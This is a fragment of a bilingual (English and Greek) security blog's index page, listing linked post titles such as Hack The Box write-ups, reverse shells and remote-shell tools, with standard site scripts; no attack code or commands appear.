           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/fast_commit_push/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/binary_flow.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Git &amp; Mercurial: How to commit-push fast and easily</h3>
      <h3 class="title" lang="el">Git &amp; Mercurial: Πως να κάνετε commit-push γρήγορα και εύκολα</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">17 Oct 2016</time>
      <time lang="el">17 Οκτ 2016</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/inception_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/mirror.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Inception (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Inception (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">14 Apr 2018</time>
      <time lang="el">14 Απρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/nl80211/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/wifi-sign.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">How to get info for the wireless interface using nl80211 in C</h3>
      <h3 class="title" lang="el">Πως να λάβετε πληροφορίες για την ασύρματη διεπαφή χρησιμοποιώντας την nl80211 στη C</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">09 Oct 2016</time>
      <time lang="el">09 Οκτ 2016</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Node (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Node (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">03 Mar 2018</time>
      <time lang="el">03 Μαρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Fortune (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Fortune (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">02 Aug 2019</time>
      <time lang="el">02 Αυγ 2019</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Falafel (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Falafel (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">23 Jun 2018</time>
      <time lang="el">23 Ιουν 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/unattended_writeup/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/unattended.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Unattended (Hack The Box) write-up</h3>
      <h3 class="title" lang="el">Ανάλυση του Unattended (Hack The Box)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">23 Aug 2019</time>
      <time lang="el">23 Αυγ 2019</time>
    </footer>
  </a>
</article>

           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
           
           
           
          
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/xor_kpa/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/keylock.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Known-plaintext attack tool for XOR-encrypted data</h3>
      <h3 class="title" lang="el">Εργαλείο επιθέσεων γνωστού αρχικού κειμένου έναντι XOR-κρυπτογραφημένων δεδομένων</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">22 Apr 2018</time>
      <time lang="el">22 Απρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/get_outlook_rules/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/flying_mail.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">How to collect Outlook rules using Powershell</h3>
      <h3 class="title" lang="el">Πως να συλλέξετε τους κανόνες του Outlook χρησιμοποιώντας Powershell</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">20 May 2022</time>
      <time lang="el">20 Μαϊ 2022</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/mssql_shell/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/dbs.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">MSSQL shell with file upload capability</h3>
      <h3 class="title" lang="el">MSSQL κέλυφος με δυνατότητα ανεβάσματος αρχείων</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">13 Apr 2018</time>
      <time lang="el">13 Απρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Reverse shells</h3>
      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">12 Apr 2018</time>
      <time lang="el">12 Απρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/oracle/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/oracle.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Ask and you shall receive</h3>
      <h3 class="title" lang="el">Ζήτα και θα λάβεις</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">04 May 2019</time>
      <time lang="el">04 Μαϊ 2019</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">09 Apr 2018</time>
      <time lang="el">09 Απρ 2018</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/bloodhound_analyzer/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/bloodhound.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Bloodhound analyzer</h3>
      <h3 class="title" lang="el">Λαγωνικός αναλυτής</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">21 Dec 2025</time>
      <time lang="el">21 Δεκ 2025</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
            <article class="li col-sm-6 col-md-4">
  <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
    <div class="cell">
      <div class="image" style="background-image: url(https://alamot.github.io/images/path.jpg);"></div>
    </div>
    <footer>
      <h3 class="title" lang="en">Path-traversal archiver</h3>
      <h3 class="title" lang="el">Αρχειοθέτης με διάσχιση διαδρομής</h3>
      <i class="fa fa-calendar"></i>
      <time lang="en">14 May 2019</time>
      <time lang="el">14 Μαϊ 2019</time>
    </footer>
  </a>
</article>

           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
           
           
           
           
          
        </div>
      </section>
      
    </div>
   </div> 
  </div>


<footer class="l-footer">
<span class="copyleft">&copy;</span>
<span lang="en">&nbsp; Antonios Tsolis &nbsp; </span>
<span lang="el">&nbsp; Αντώνιος Τσώλης &nbsp; </span>
<script>
  function email(starting,server,firstname,lastname,subject,body,closing) {
    document.write(starting); document.write(lastname); document.write("." + firstname); document.write("@" + server);if (Boolean(subject)) { document.write("?subject=" + subject + "&body=" + body); }
    document.write(closing); }
  email("<a class='mymail' aria-label='Send me an email' href='mailto:", "gmail.com", "antonios", "tsolis", "", "","' target='_blank'><i class='fa fa-envelope-o' aria-hidden='true'></i></a>");
</script>
</footer>
<script async src="https://alamot.github.io/js/jq-btsp-lunr.min.js" onload="init()"></script>
<script>
short_months = {
  "en": ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"],
  "el": ["Ιαν", "Φεβ", "Μαρ", "Απρ", "Μαϊ", "Ιουν", "Ιουλ", "Αυγ", "Σεπ", "Οκτ", "Νοε", "Δεκ"]
}
function init () {
$(document).ready(function(){
  $("#lang-selector>ul>li>a").click(function(){
    var langid = this.id;
    var selText = this.text;
    document.getElementById('mainbody').setAttribute('class', langid);
    document.getElementById('mainbody').setAttribute('lang', langid);
    localStorage.setItem('language', langid);
    $("#lang-selector>a").html(selText+' <i class="fa fa-caret-down" aria-hidden="true"></i>');
  });

  $("#TableOfContents a, #content-selector a").on('click', function(e) {
    var hash = this.hash;
    if (hash) {
      e.preventDefault();
      $('html, body').animate({scrollTop: $(hash).offset().top}, 1300, function(){
        window.location.hash = hash;
      });
    }  
  });

  
});}
</script>
<script>
(function(a){var b=function(b,h,n){function d(a){if(f.body)return a();setTimeout(function(){d(a)})}function k(){c.addEventListener&&c.removeEventListener("load",k);c.media=n||"all"}var f=a.document,c=f.createElement("link"),g;if(h)g=h;else{var e=(f.body||f.getElementsByTagName("head")[0]).childNodes;g=e[e.length-1]}var m=f.styleSheets;c.rel="stylesheet";c.href=b;c.media="only x";d(function(){g.parentNode.insertBefore(c,h?g:g.nextSibling)});var l=function(a){for(var b=c.href,d=m.length;d--;)if(m[d].href===
b)return a();setTimeout(function(){l(a)})};c.addEventListener&&c.addEventListener("load",k);c.onloadcssdefined=l;l(k);return c};"undefined"!==typeof exports?exports.loadCSS=b:a.loadCSS=b})("undefined"!==typeof global?global:this);
(function(a){if(a.loadCSS){var b=loadCSS.relpreload={};b.support=function(){try{return a.document.createElement("link").relList.supports("preload")}catch(h){return!1}};b.poly=function(){for(var b=a.document.getElementsByTagName("link"),e=0;e<b.length;e++){var d=b[e];"preload"===d.rel&&"style"===d.getAttribute("as")&&(a.loadCSS(d.href,d),d.rel=null)}};if(!b.support()){b.poly();var e=a.setInterval(b.poly,300);a.addEventListener&&a.addEventListener("load",function(){a.clearInterval(e)});a.attachEvent&&
a.attachEvent("onload",function(){a.clearInterval(e)})}}})(this);
</script>
<script>
function labnolIframe(div) {
  var iframe = document.createElement('iframe');
  iframe.setAttribute('src', 'https://www.youtube.com/embed/' + div.dataset.id + '?autoplay=1');
  iframe.setAttribute('frameborder', '0');
  iframe.setAttribute('allowfullscreen', '1');
  iframe.setAttribute('allow', 'accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture');
  div.parentNode.replaceChild(iframe, div);
}

function initYouTubeVideos() {
  var playerElements = document.querySelectorAll('.youtube-player');
  for (var n = 0; n < playerElements.length; n++) {
    var videoId = playerElements[n].dataset.id;
    var div = document.createElement('div');
    div.setAttribute('data-id', videoId);
    var thumbNode = document.createElement('img');
    thumbNode.src = '//i.ytimg.com/vi/ID/hqdefault.jpg'.replace('ID', videoId);
    div.appendChild(thumbNode);
    var playButton = document.createElement('div');
    playButton.setAttribute('class', 'play');
    div.appendChild(playButton);
    div.onclick = function () {
      labnolIframe(this);
    };
    playerElements[n].appendChild(div);
  }
}

document.addEventListener('DOMContentLoaded', initYouTubeVideos);
</script>
</body>
</html>

